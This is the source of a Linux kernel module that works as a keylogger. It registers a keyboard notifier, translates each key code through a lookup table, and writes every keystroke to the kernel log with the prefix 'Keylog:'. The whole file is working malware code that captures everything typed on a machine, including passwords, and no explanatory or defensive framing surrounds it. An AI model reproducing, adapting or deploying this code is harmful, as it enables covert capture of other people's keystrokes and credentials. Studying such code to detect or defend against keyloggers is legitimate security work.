#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>

static const char *mass_of_key[][2] = { {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"}, 
{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"}, 
{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"}, 
{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"}, 
{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"}, 
{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"}, 
{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"}, 
{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"}, 
{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, 
{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"}, 
{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, 
{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"}, 
{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"}, 
{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"}, {"_LALT_", "_LALT_"}, 
{" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"}, {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, 
{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, 
{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"}, 
{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, 
{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"}, 
{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"}, 
{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, 
{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, 
{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"}, 
{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
{"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"}, {"_PRTSCR_", "_PRTSCR_"}, 
{"_RALT_", "_RALT_"}, {"\0", "\0"}, 
{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"}, 
{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"}, {"_DOWN_", "_DOWN_"}, 
{"_PGDN", "_PGDN"}, {"_INS_", "_INS_"}, 
{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
{"_PAUSE_", "_PAUSE_"},};


void func_transf_code(void *_param, char *buffer, unsigned int size_buff){
	struct keyboard_notifier_param *param = _param;
	if (param->value > KEY_RESERVED && param->value <= KEY_PAUSE){
		char *key = NULL;
		if (param->shift == 1){
			key = mass_of_key[param->value][1];
		}
		else {
			key = mass_of_key[param->value][0];
		}
		strncpy(buffer, key, size_buff);	
	}
}

static int keyboard_notifier_call(struct notifier_block *nb, unsigned long action, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	int ret = NOTIFY_OK;
	char keybuffer[12] = {0};
	if (!param->down)
		return ret;
	
	func_transf_code(_param, keybuffer, 12);
	printk(KERN_INFO "Keylog: %s", keybuffer);

	if (strlen(keybuffer) < 1) return ret;
	return ret;	
}

static struct notifier_block keyboard_notifier_block = {
	.notifier_call = keyboard_notifier_call,
};

int init_module(void)
{
    register_keyboard_notifier(&keyboard_notifier_block);
    return 0;
}
 
void cleanup_module(void)
{
    unregister_keyboard_notifier(&keyboard_notifier_block);
}
 
MODULE_LICENSE("GPL");

